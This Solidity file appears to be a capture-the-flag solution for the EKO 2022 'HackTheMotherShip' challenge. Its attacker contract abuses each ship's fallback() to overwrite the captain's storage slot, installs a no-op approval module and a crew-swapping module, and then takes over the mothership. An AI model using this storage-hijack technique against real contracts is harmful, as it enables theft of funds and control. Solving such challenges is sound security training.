// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Mothership, SpaceShip, CleaningModule, RefuelModule, LeadershipModule} from "../../src/eko2022/02_HackTheMotherShip/HackTheMotherShip.sol";

contract HackTheMotherShip_Attacker {
	address player;
	Mothership mothership;
	
	constructor(Mothership mothership_) {
		player = msg.sender;
		mothership = mothership_;
	}
	
	receive() external payable {}
	
	function doAttack() public {
		// 提前准备破解升级模块
		LeadershipModule_Hacker leadershipModule_Hacker = new LeadershipModule_Hacker();
		ChangeCrew_Hacker changeCrew_Hacker = new ChangeCrew_Hacker();
		// 把每一艘舰船作为攻击目标，篡改它们的舰长，且升级它们的批准模块
		for (uint i=0; i < mothership.fleetLength(); i++) {
			SpaceShip spaceShipTarget = mothership.fleet(i);
			// 利用舰船合约的 fallback() 漏洞，来篡改该舰船的槽位数据(更改舰长)
			bytes memory hackCaptainData = abi.encodeCall(CleaningModule.replaceCleaningCompany, (address(this)));
			(bool success,) = address(spaceShipTarget).call(hackCaptainData);
			require(success, "CleaningModule.replaceCleaningCompany Failed");
			// 篡改舰长成功
			require(spaceShipTarget.captain() == address(this));
			
			// 破解升级模块(为了后续批准通过)
			spaceShipTarget.addModule(LeadershipModule.isLeaderApproved.selector, address(leadershipModule_Hacker));
			// 继续添加破解升级模块(为了补充船员)
			spaceShipTarget.addModule(ChangeCrew_Hacker.addCrew_RemoveCaptain.selector, address(changeCrew_Hacker));
			
			// 利用舰船合约的 fallback() 漏洞，来篡改该舰船的槽位数据(添加船员、移除船长)
			// 为了满足 askForNewCaptain 的执行要求，必须`添加船员、移除船长`
			bytes memory hackCrewData = abi.encodeCall(ChangeCrew_Hacker.addCrew_RemoveCaptain, (address(this)));
			(success,) = address(spaceShipTarget).call(hackCrewData);
			require(success, "ChangeCrew_Hacker.addCrew_RemoveCaptain Failed");
			require(spaceShipTarget.crew(0) == address(this));
			// console.log("spaceShipTarget.crew(0)", spaceShipTarget.crew(0));
		}
		
		// 构建在`无舰长`的情况下，向母舰注册舰长
		mothership.fleet(0).askForNewCaptain(address(this));
		
		// 自此，已经成为第一艘舰船的舰长，且注册在母舰
		
		// 篡改母舰的leader
		mothership.promoteToLeader(address(this));
		// 最终，完成入侵母舰。
		mothership.hack();
	}
}

contract LeadershipModule_Hacker {
	function isLeaderApproved(address) external pure {
		// Nothing
	}
}

contract ChangeCrew_Hacker {
	address public captain;
	address[] public crew;
	
	function addCrew_RemoveCaptain(address crew_) public {
		captain = address(0);
		crew.push(crew_);
	}
}
